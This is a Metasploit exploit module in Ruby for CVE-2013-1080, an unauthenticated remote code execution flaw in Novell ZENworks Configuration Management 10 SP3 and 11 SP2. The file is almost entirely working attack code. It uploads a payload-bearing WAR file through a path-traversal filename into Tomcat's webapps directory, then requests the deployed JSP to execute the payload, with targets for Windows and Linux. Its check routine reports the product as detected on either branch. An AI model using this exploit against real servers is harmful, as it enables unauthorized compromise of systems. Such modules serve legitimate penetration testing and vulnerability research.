# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Novell ZENworks Configuration Management Remote Execution&#039;,
      &#039;Description&#039; => %q{
          This module exploits a code execution flaw in Novell ZENworks Configuration
        Management 10 SP3 and 11 SP2. The vulnerability exists in the ZEnworks Control
        Center application, allowing an unauthenticated attacker to upload a malicious file
        outside of the TEMP directory and then make a second request that allows for
        arbitrary code execution. This module has been tested successfully on Novell
        ZENworks Configuration Management 10 SP3 and 11 SP2 on Windows 2003 SP2 and SUSE
        Linux Enterprise Server 10 SP3.
      },
      &#039;Author&#039;      =>
        [
          &#039;James Burton&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2013-1080&#039; ],
          [ &#039;BID&#039;, &#039;58668&#039; ],
          [ &#039;OSVDB&#039;, &#039;91627&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-049/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.novell.com/support/kb/doc.php?id=7011812&#039; ]
        ],
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;    => [ &#039;win&#039;, &#039;linux&#039; ],
      &#039;Targets&#039;     =>
        [
          [ &#039;ZENworks Configuration Management 10 SP3 and 11 SP2 / Windows 2003 SP2&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Traversal&#039; => &#039;../webapps/&#039;
            }
          ],
          [ &#039;ZENworks Configuration Management 10 SP3 and 11 SP2 / SUSE Linux Enterprise Server 10 SP3&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Traversal&#039; => &#039;../../opt/novell/zenworks/share/tomcat/webapps/&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 1,
      &#039;DisclosureDate&#039; => &#039;Mar 22 2013&#039;))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/zenworks/jsp/fw/internal/Login.jsp"
    })

    if res and res.code == 200 and res.body =~ /Novell ZENworks Control Center/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Detected
  end

  def exploit

    # Generate the WAR containing the EXE containing the payload
    app_base = rand_text_alphanumeric(4+rand(4))
    jsp_name = rand_text_alphanumeric(8+rand(8))

    war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s

    print_status("Uploading #{war_data.length} bytes as #{app_base}.war ...")

    # Rex::MIME::Message.new doesn&#039;t work fine with binary data, destroys "\x0d" chars
    boundary = "----#{rand_text_alpha(34)}"
    data = "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"mainPage:_ctrl21a:FindFile:filePathTextBox\"; filename=\"#{target[&#039;Traversal&#039;]}#{app_base}.war\"\r\n"
    data << "Content-Type: application/octet-stream\r\n\r\n"
    data << war_data
    data << "\r\n"
    data << "--#{boundary}--"

    res = send_request_cgi(
      {
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => "/zenworks/jsp/index.jsp?pageid=newDocumentWizard",
        &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
        &#039;data&#039;   => data
      })

    if res and res.code == 302
      print_status("Upload finished, waiting 20 seconds for payload deployment...")
    else
      fail_with(Exploit::Failure::Unknown, "Failed to upload payload")
    end

    # Wait to ensure the uploaded war is deployed
    select(nil, nil, nil, 20)

    print_status("Triggering payload at &#039;/#{app_base}/#{jsp_name}.jsp&#039; ...")
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(app_base, "#{jsp_name}.jsp"),
      &#039;method&#039; => &#039;GET&#039;,
    })
  end

end

